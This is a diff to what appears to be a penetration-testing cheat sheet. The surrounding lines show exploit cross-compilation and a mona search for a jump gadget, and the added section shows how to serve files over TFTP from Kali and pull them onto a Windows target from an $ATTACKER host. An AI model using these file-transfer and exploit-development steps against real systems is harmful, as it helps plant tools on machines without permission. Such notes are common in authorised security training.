@@ -127,6 +127,16 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 !mona find -s "\xFF\xE4" -m moduleName
 ```
 
+##### Uploading Files to Target Machine
+```bash
+#tftp; cat /etc/default/atftpd to find out file serving location; default in kali /srv/tftp
+service atftpd start
+
+# Windows
+tftp $ATTACKER get /download/location /save/location
+
+```
+
 
 ##### Bash Ping Sweeper
 ```bash
